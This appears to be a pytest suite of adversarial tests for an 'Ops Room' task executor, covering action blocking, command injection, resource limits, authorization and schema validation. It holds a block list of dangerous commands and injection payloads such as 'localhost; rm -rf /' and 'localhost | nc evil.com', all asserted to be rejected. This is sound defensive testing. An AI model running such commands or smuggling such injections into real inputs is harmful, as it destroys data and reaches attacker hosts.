"""Master adversarial suite for Ops Room — security, containment, protocol.

Rules for this file:
  * every test is marked `slow` — excluded from fast PR runs
  * every test is adversarial — it tries to break the ops room
"""
from __future__ import annotations

import pytest

pytestmark = [pytest.mark.slow, pytest.mark.adversarial]


# ══════════════════════════════════════════════════════════════════════════
# A. Task Shield — must block dangerous operations
# ══════════════════════════════════════════════════════════════════════════

DANGEROUS_ACTIONS = [
    "execute_shell", "run_command", "os.system", "subprocess",
    "rm -rf", "format disk", "shutdown", "reboot",
    "chmod 777", "chown root", "sudo", "su",
]

@pytest.mark.asyncio
async def test_a1_dangerous_actions_blocked(ops_room):
    """Dangerous task actions must be blocked."""
    for action in DANGEROUS_ACTIONS:
        with pytest.raises(Exception) as excinfo:
            await ops_room.execute_task("dangerous-task", {"action": action})
        assert "blocked" in str(excinfo.value).lower() or "invalid" in str(excinfo.value).lower()


@pytest.mark.asyncio
async def test_a2_command_injection_blocked(ops_room):
    """Command injection attempts must be blocked."""
    injection_payloads = [
        {"action": "ping", "target": "localhost; rm -rf /"},
        {"action": "ping", "target": "localhost && curl evil.com"},
        {"action": "ping", "target": "localhost | nc evil.com"},
    ]
    for payload in injection_payloads:
        with pytest.raises(Exception):
            await ops_room.execute_task("injection-test", payload)


# ══════════════════════════════════════════════════════════════════════════
# B. Resource Containment — must enforce task limits
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_b1_task_timeout_enforced(ops_room):
    """Long-running tasks must be terminated by timeout."""
    with pytest.raises(TimeoutError):
        await ops_room.execute_task("timeout-test", {"action": "sleep", "duration": 10}, timeout=1)


@pytest.mark.asyncio
async def test_b2_memory_limit_enforced(ops_room):
    """Memory-intensive tasks must be rejected."""
    memory_task = {"action": "allocate_memory", "mb": 1000}
    with pytest.raises(MemoryError):
        await ops_room.execute_task("memory-test", memory_task, max_memory_mb=100)


@pytest.mark.asyncio
async def test_b3_cpu_limit_enforced(ops_room):
    """CPU-intensive tasks must be throttled."""
    cpu_task = {"action": "cpu_stress", "percent": 100}
    result = await ops_room.execute_task("cpu-test", cpu_task, max_cpu_percent=50)
    assert result.get("throttled", False) is True or result.get("rejected", False) is True


# ══════════════════════════════════════════════════════════════════════════
# C. Authorization — must enforce task permissions
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_c1_unauthorized_task_blocked(ops_room):
    """Users must not execute tasks outside their permissions."""
    with pytest.raises(Exception):
        await ops_room.execute_task("admin-task", {"action": "system_config"}, user_role="viewer")


@pytest.mark.asyncio
async def test_c2_cross_user_task_access_blocked(ops_room):
    """Users must not access other users' tasks."""
    task_id = await ops_room.queue_task("user1-task", {"action": "process"}, user_id=1)
    with pytest.raises(Exception):
        await ops_room.get_task_status(task_id, user_id=2)


# ══════════════════════════════════════════════════════════════════════════
# D. Protocol Conformance — task schema must be strictly validated
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_d1_invalid_task_schema_rejected(ops_room):
    """Invalid task schemas must be rejected."""
    invalid_tasks = [
        {"invalid": "schema"},
        {"action": None},
        {"action": 123},
        {},
    ]
    for task in invalid_tasks:
        with pytest.raises(Exception):
            await ops_room.execute_task("schema-test", task)


@pytest.mark.asyncio
async def test_d2_unknown_action_rejected(ops_room):
    """Unknown task actions must be rejected."""
    with pytest.raises(Exception):
        await ops_room.execute_task("unknown-action", {"action": "nonexistent_action_12345"})


@pytest.mark.asyncio
async def test_d3_missing_required_params_rejected(ops_room):
    """Tasks missing required parameters must be rejected."""
    with pytest.raises(Exception):
        await ops_room.execute_task("missing-params", {"action": "ping"})